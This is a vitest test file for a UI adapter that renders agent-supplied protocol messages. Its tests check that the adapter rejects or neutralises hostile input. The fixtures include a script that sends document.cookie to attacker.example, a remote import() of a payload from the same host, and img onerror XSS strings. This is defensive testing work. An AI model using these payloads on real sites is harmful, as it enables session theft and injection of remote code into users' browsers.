// @spec:029-adapter-a2ui
// User Story 2 (P1): hostile protocol input fails closed. These are the
// adversarial scenarios behind the Art. VIII guardrail — a forbidden type, an
// undeclared action, an unknown property carrying code, active content in the
// data model, and a hostile payload under an unmapped type. Nothing renders
// from a rejection, and no code path opens from message data.
import { beforeEach, describe, expect, it } from 'vitest';

import { createA2uiAdapter } from '../src/index.js';

let surface: HTMLElement;

beforeEach(() => {
  document.body.replaceChildren();
  surface = document.createElement('div');
  document.body.appendChild(surface);
});

const orderSurface = () => ({
  surfaceUpdate: {
    surfaceId: 'checkout',
    root: 'card',
    components: [
      { id: 'card', component: { Card: { children: { explicitList: ['confirm'] } } } },
      {
        id: 'confirm',
        component: {
          Button: { label: { literalString: 'Confirm order' }, action: { name: 'confirm-order' } },
        },
      },
    ],
  },
});

describe('the guardrail is a security boundary no message can bypass', () => {
  it('S7 rejects a message using a type the matrix declares forbidden', () => {
    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });

    const result = adapter.apply({
      surfaceUpdate: {
        surfaceId: 's',
        root: 'root',
        components: [
          { id: 'root', component: { Card: { children: { explicitList: ['evil'] } } } },
          {
            id: 'evil',
            component: {
              html: {
                content: {
                  literalString:
                    "<script>fetch('https://attacker.example/'+document.cookie)</script>",
                },
              },
            },
          },
        ],
      },
    });

    expect(result.ok).toBe(false);
    expect(result.diagnostics.some((d) => d.rule === 'forbidden-type' && d.value === 'html')).toBe(
      true,
    );
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S8 never dispatches an action outside the declared set', () => {
    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });
    adapter.apply(orderSurface());

    const result = adapter.apply({
      surfaceUpdate: {
        surfaceId: 'checkout',
        components: [
          {
            id: 'card',
            component: { Card: { children: { explicitList: ['confirm', 'export'] } } },
          },
          {
            id: 'export',
            component: {
              Button: {
                label: { literalString: 'Export account data' },
                action: { name: 'export-account-data' },
              },
            },
          },
        ],
      },
    });

    expect(result.ok).toBe(false);
    expect(
      result.diagnostics.some(
        (d) => d.rule === 'undeclared-action' && d.value === 'export-account-data',
      ),
    ).toBe(true);
    // The rejected re-render leaves the previous surface intact; the export
    // button never rendered, so activating it dispatches nothing.
    const buttons = [...surface.querySelectorAll('ki-button')];
    expect(buttons.some((b) => b.textContent === 'Export account data')).toBe(false);
    expect(buttons.some((b) => b.textContent === 'Confirm order')).toBe(true);
  });

  it('S9 rejects an unknown property on a catalog component', () => {
    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });

    const result = adapter.apply({
      surfaceUpdate: {
        surfaceId: 's',
        root: 'b',
        components: [
          {
            id: 'b',
            component: {
              Button: {
                label: { literalString: 'Go' },
                onPointerEnter: { literalString: "import('https://attacker.example/payload.js')" },
              },
            },
          },
        ],
      },
    });

    expect(result.ok).toBe(false);
    expect(
      result.diagnostics.some((d) => d.rule === 'unknown-prop' && d.value === 'onPointerEnter'),
    ).toBe(true);
    expect(surface.childNodes).toHaveLength(0);
  });

  it('S10 renders data-model content as inert text, never as code', () => {
    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });
    adapter.apply({
      surfaceUpdate: {
        surfaceId: 's',
        root: 'card',
        components: [
          { id: 'card', component: { Card: { children: { explicitList: ['label'] } } } },
          {
            id: 'label',
            component: { Text: { text: { path: '/label', literalString: 'initial' } } },
          },
        ],
      },
    });

    const result = adapter.apply({
      dataModelUpdate: {
        surfaceId: 's',
        path: '/label',
        contents: '<img src=x onerror=alert(document.domain)>',
      },
    });

    expect(result.ok).toBe(true);
    const card = surface.querySelector('ki-card');
    expect(card?.textContent).toContain('<img src=x onerror=alert(document.domain)>');
    // The characters are inert text, never a parsed element.
    expect(surface.querySelector('img')).toBeNull();
  });

  it('S11 keeps a hostile payload under an unmapped type out of the fallback', () => {
    const adapter = createA2uiAdapter({ protocolVersion: '0.9.1', surface });

    const result = adapter.apply({
      surfaceUpdate: {
        surfaceId: 's',
        root: 'card',
        components: [
          { id: 'card', component: { Card: { children: { explicitList: ['weird'] } } } },
          {
            id: 'weird',
            component: {
              MysteryWidget: { content: { literalString: '<img src=x onerror=alert(1)>' } },
            },
          },
        ],
      },
    });

    expect(result.ok).toBe(true);
    // The declared fallback rendered, carrying only its constant label...
    expect(surface.querySelector('ki-badge')?.textContent).toBe('Unsupported component');
    // ...and no agent-supplied content reached the DOM.
    expect(surface.querySelector('img')).toBeNull();
    expect(surface.textContent).not.toContain('onerror');
  });
});
